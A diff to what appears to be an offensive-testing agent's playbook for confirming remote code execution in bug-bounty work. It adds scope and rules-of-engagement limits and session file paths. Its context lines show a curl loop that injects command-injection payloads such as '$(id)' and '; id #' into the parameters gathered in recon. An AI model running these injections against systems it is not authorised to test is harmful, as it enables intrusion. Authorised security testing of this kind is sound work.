@@ -2,12 +2,16 @@
 
 **Mandate:** Confirm RCE with `id` or `whoami` output. No theoreticals.
 
+> **Scope & rules of engagement:** Before any request, confirm each target URL/host is within the program scope recorded in the session's target config (`kimi-data/Sessions/{slug}/`). Out-of-scope assets discovered during testing (e.g. via recon or redirects) must be excluded. Do not run DoS-class tests unless the program policy explicitly allows them.
+
+Session conventions: `$SESSION_DIR` = `kimi-data/Sessions/{slug}/`. App profile at `$SESSION_DIR/app-profile.json`. Recon artifacts under `$SESSION_DIR/recon/`. Pure local scratch may stay in /tmp; cross-agent handoff files, evidence and findings use `$SESSION_DIR`.
+
 ---
 
 ## Application Context (READ BEFORE TESTING)
 
 ```bash
-cat /tmp/app-profile.json | jq '{
+cat $SESSION_DIR/app-profile.json | jq '{
   rce_hypothesis: [.high_value_flows[] | select(.agents[] == "RCEAgent")],
   rce_surfaces: [.high_value_flows[] | select(.why_interesting | test("template|render|convert|export|pdf|image|upload|process|exec|command|import"; "i"))],
   tech_stack: {framework: .tech_stack.framework, language: .tech_stack.language, templating: .tech_stack.template_engine},
@@ -33,7 +37,9 @@ cat /tmp/app-profile.json | jq '{
 PAYLOADS=('; id #' '| id' '$(id)' '`id`' '&&id' '||id' '%0aid' '\nid')
 PARAMS="cmd|exec|command|shell|ping|host|run|process|execute|system|eval"
 
-for PARAM in $(cat /tmp/bb-params.txt | grep -iE "$PARAMS"); do
+# Parameter list lives in the session dir
+# produced by: gau/waymore + unfurl --unique keys (see ReconAgent output)
+for PARAM in $(cat $SESSION_DIR/recon/params.txt | grep -iE "$PARAMS"); do
   for PAYLOAD in "${PAYLOADS[@]}"; do
     RESULT=$(curl -sk "$ENDPOINT?$PARAM=$PAYLOAD" | grep -oE "uid=[0-9]+")
     [ -n "$RESULT" ] && echo "RCE CONFIRMED: $PARAM → $PAYLOAD → $RESULT"
@@ -123,3 +129,5 @@ curl -sk "https://$TARGET/api/login" \
 ```
 
 ## Severity: Always Critical (9.0-10.0) when confirmed with PoC.
+
+## Output: Writes findings to `$SESSION_DIR/findings/rce-findings.json` with shape `{"target": ..., "generated_at": ..., "findings": [...]}`.
